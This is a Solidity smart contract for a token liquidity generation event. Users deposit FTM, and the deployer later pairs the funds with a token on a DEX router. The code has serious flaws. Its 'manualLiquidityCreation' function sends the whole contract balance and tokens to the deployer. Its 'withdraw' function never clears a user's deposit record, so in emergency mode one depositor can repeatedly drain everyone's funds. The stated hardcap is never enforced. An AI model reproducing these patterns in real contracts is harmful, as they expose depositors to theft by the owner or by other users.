pragma solidity ^0.7.6;
// author: SamPorter1984
interface I{
	function getPair(address t, address t1) external view returns(address pair);
	function createPair(address t, address t1) external returns(address pair);
	function genesis(uint Ftm,address pair,uint gen) external;
	function transfer(address to, uint value) external returns(bool);
	function addLiquidityETH(address token,uint amountTokenDesired,uint amountTokenMin,uint amountETHMin,address to,uint deadline)external payable returns(uint amountToken,uint amountETH,uint liquidity);
//  function approve(address spender, uint256 amount) external returns (bool);
}

contract FoundingEvent {
	mapping(address => uint) public deposits;
	address payable private _deployer;
	bool private _lgeOngoing;
	bool private _emergency;
	uint public hardcap;
	uint public genesisBlock;
	uint256 private _lock;
	address private _letToken;

	constructor() public {_deployer = msg.sender; _letToken=0x15D2fb015f8895f35Abd702be852a9Eb23c16E2F;}//to change on deployment
	function startLGE(uint hc) external {require(msg.sender == _deployer);if(hardcap != 0){require(hc<hardcap);}_lgeOngoing = true; hardcap = hc;}
	function triggerLaunch() public {require(msg.sender == _deployer);_createLiquidity();}

	function depositFtm() external payable {
		require(_lgeOngoing == true); uint amount = msg.value; uint deployerShare = amount/100; amount -= deployerShare; _deployer.transfer(deployerShare); deposits[msg.sender] += amount;
	}

	function _createLiquidity() internal {
		genesisBlock = block.number;
		address WFTM = 0xd9145CCE52D386f254917e481eB44e9943F39138;
		address staking = 0x2D9F853F1a71D0635E64FcC4779269A05BccE2E2;//to change on deployment
		address factory = 0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8;
		address router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
		address tknFTMLP = I(factory).getPair(_letToken,WFTM); if (tknFTMLP == address(0)) {tknFTMLP=I(factory).createPair(_letToken, WFTM);}
		//I(_letToken).approve(address(router), 1e24);//careful, if token contract does not have hardcoded allowance for the router you need this line
        	I(router).addLiquidityETH{value: address(this).balance}(_letToken,1e24,0,0,staking,1e35);
        	I(staking).genesis(address(this).balance, tknFTMLP,block.number);
	    	delete _lgeOngoing;
	}

	function toggleEmergency() public { require(msg.sender==_deployer); if(_emergency != true){_emergency = true; delete _lgeOngoing;} else{delete _emergency;} }
	function withdraw() public { require(_emergency == true && deposits[msg.sender]>0 && _lock!=1);_lock=1; payable(msg.sender).transfer(deposits[msg.sender]); _lock=0; }

    function manualLiquidityCreation() external {
    	require(msg.sender == _deployer&& address(this).balance>0); genesisBlock = block.number;
    	_deployer.transfer(address(this).balance); I(_letToken).transfer(_deployer, 1e24); delete _lgeOngoing;
    }
}
